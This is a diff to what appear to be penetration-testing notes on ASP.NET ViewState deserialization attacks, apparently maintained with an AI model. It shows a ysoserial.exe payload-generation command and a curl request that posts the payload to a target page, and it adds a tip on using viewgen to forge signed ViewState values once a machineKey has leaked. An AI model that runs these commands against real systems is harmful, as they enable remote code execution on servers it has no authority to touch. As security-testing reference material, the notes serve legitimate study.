@@ -579,6 +579,8 @@ ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" 
 curl -X POST http://target.com/page.aspx -d "__VIEWSTATE=<payload>&__VIEWSTATEGENERATOR=<generator_value>"
 ```
 
+> [!tip] **`viewgen` ([github.com/0xacb/viewgen](https://github.com/0xacb/viewgen)) is the Python alternative to `ysoserial.net`** — it *encodes/decodes* ViewState and computes the MAC from a known `validationKey`, so it runs on Linux with no Windows/.NET toolchain. Use it to craft a signed `__VIEWSTATE` once you've leaked the `machineKey`, or to confirm whether MAC validation is even enabled: `viewgen --decode --key <validationKey> --modifier <generator> "<__VIEWSTATE>"`.
+
 ### .NET Insecure Deserialization
 
 **BinaryFormatter / ObjectStateFormatter / LosFormatter:**
@@ -859,5 +861,5 @@ Identify stack (whatweb, headers, cookies, error pages)
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-14*
+*Updated: 2026-08-21*
 *Model: claude-opus-5*
